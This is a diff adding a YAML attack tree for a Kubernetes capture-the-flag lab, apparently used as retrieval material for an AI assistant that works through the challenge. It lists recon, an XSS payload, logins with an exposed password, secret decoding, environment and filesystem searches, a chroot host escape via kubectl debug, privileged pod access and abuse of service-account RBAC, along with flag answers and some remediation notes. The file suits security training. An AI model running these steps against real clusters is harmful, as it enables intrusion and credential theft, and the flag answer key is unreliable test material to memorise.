@@ -1,0 +1,143 @@
+attack:
+  id: 0
+  name: "Kubernetes CTF Cluster Compromise"
+  description: "Structured attack tree used as RAG for a GPT-4o-based assistant to simulate flag capture in a vulnerable Kubernetes environment."
+
+  steps:
+
+    - id: 1.0
+      name: "Initial Web Recon"
+      tags: ["web", "recon"]
+      command: "curl -s http://localhost:80"
+      output_var: homepage_html
+      conditions:
+        - match: "checkFlag"
+          next:
+            - id: 1.1
+              name: "Trigger client-side JS flag leak"
+              command: "curl -s 'http://localhost:80/?message=<img src=x onerror=\"alert(checkFlag())\">'"
+              on_success:
+                - capture_flag: "FLAG{client_side_javascript_leak}"
+        - match: "d3fault_adm1n_p@ss"
+          next:
+            - id: 1.2
+              name: "Try GET /admin with exposed password"
+              command: "curl -s http://localhost:80/admin -u admin:d3fault_adm1n_p@ss"
+              on_failure:
+                - log: "GET /admin failed"
+            - id: 1.3
+              name: "Try POST /admin with exposed credentials"
+              command: "curl -s -X POST http://localhost:80/admin --data 'username=admin&password=d3fault_adm1n_p@ss'"
+              on_failure:
+                - log: "POST /admin failed"
+
+    - id: 2.0
+      name: "Enumerate Kubernetes Resources"
+      tags: ["k8s", "recon"]
+      preconditions:
+        - must_have: "kubectl access"
+        - must_be_in_namespace: "vulnerable-app"
+      command: "kubectl get all -n vulnerable-app"
+
+    - id: 2.1
+      name: "Inspect node-flag-placement Job"
+      command: "kubectl describe job node-flag-placement -n vulnerable-app"
+      conditions:
+        - match: "/host/tmp/k8s-node-flag.txt"
+          next:
+            - id: 2.2
+              name: "Escape to host via chroot"
+              tags: ["container_escape", "privilege_escalation"]
+              command: "kubectl debug node/lima-rancher-desktop -it --image=alpine -- chroot /host"
+              next:
+                - id: 2.3
+                  name: "Read flag from host tmp"
+                  command: "cat /tmp/k8s-node-flag.txt"
+                  on_success:
+                    - capture_flag: "FLAG{node_compromise_via_hostpath}"
+                    - remediation: "Avoid using HostPath volumes in untrusted Jobs"
+
+    - id: 3.0
+      name: "Decode Secret: application-secrets"
+      tags: ["k8s", "secrets"]
+      command: "kubectl get secret application-secrets -n vulnerable-app -o jsonpath='{.data.flag}' | base64 -d"
+      on_success:
+        - capture_flag: "FLAG{secrets_badly_managed}"
+        - remediation: "Do not store sensitive data directly in Kubernetes secrets without encryption at rest and RBAC"
+
+    - id: 4.0
+      name: "Check Environment Variables (Backend)"
+      tags: ["env", "info_leak"]
+      command: "kubectl exec -n vulnerable-app deploy/backend -- printenv | grep FLAG"
+      on_success:
+        - capture_flag: "FLAG{environment_variables_exposure_backend}"
+        - capture_flag: "FLAG{insecure_k8s_deployment}"
+        - remediation: "Avoid exposing secrets via env vars; prefer mounted secrets with proper RBAC"
+
+    - id: 4.1
+      name: "Check Environment Variables (Frontend)"
+      command: "kubectl exec -n vulnerable-app deploy/frontend -- printenv | grep FLAG"
+      on_success:
+        - capture_flag: "FLAG{environment_variables_exposure_frontend}"
+
+    - id: 5.0
+      name: "Analyze ConfigMap: db-credentials"
+      tags: ["k8s", "configmap", "info_leak"]
+      command: "kubectl get configmap db-credentials -n vulnerable-app -o yaml"
+      conditions:
+        - match: "FLAG:"
+          next:
+            - id: 5.1
+              name: "Extract ConfigMap Flag"
+              command: "grep FLAG <<< $(kubectl get configmap db-credentials -n vulnerable-app -o yaml)"
+              on_success:
+                - capture_flag: "FLAG{sensitive_data_in_configmap}"
+
+    - id: 6.0
+      name: "Privileged Admin Pod Access"
+      tags: ["privileged", "container_escape"]
+      command: "kubectl exec -n vulnerable-app admin-tools -- cat /root/flag.txt"
+      on_success:
+        - capture_flag: "FLAG{privileged_admin_pod}"
+
+    - id: 7.0
+      name: "Search Backend Filesystem"
+      tags: ["image_inspection", "static_flag"]
+      command: "kubectl exec -n vulnerable-app deploy/backend -- sh -c 'grep -r FLAG /app || true'"
+      on_success:
+        - capture_flag: "FLAG{backend_database_access}"
+        - capture_flag: "FLAG{debug_mode_information_leak}"
+        - capture_flag: "FLAG{missing_network_policy}"
+        - capture_flag: "FLAG{sensitive_backend_config}"
+        - capture_flag: "FLAG{insecure_shell_script_flag}"
+        - capture_flag: "FLAG{environment_variables_exposure_backend}"
+
+    - id: 7.1
+      name: "Search Frontend Filesystem"
+      command: "kubectl exec -n vulnerable-app deploy/frontend -- sh -c 'grep -r FLAG /app || true'"
+      on_success:
+        - capture_flag: "FLAG{docker_image_history_leak}"
+        - capture_flag: "FLAG{entrypoint_script_leak}"
+        - capture_flag: "FLAG{admin_portal_access}"
+        - capture_flag: "FLAG{backdoor_in_maintenance_script}"
+
+    - id: 8.0
+      name: "Check ClusterRoleBinding for vulnerable-sa"
+      tags: ["rbac", "privilege_escalation"]
+      command: "kubectl get clusterrolebinding vulnerable-cluster-rolebinding -o yaml"
+      conditions:
+        - match: "vulnerable-sa"
+          next:
+            - id: 8.1
+              name: "Use vulnerable-sa to spawn inspection pod"
+              command: "kubectl run inspector -n vulnerable-app --rm -it --restart=Never --image=bitnami/kubectl --overrides='...'"
+              on_success:
+                - log: "Confirmed: cluster-admin level access via vulnerable-sa"
+                - remediation: "Limit RBAC for service accounts"
+
+    - id: 9.0
+      name: "Attempt Pod Escape with HostPID/Privileged Pod"
+      tags: ["container_escape"]
+      command: "kubectl run pwned -n vulnerable-app --rm -it --restart=Never --image=alpine --overrides='...'"
+      on_failure:
+        - log: "Privileged escape failed"
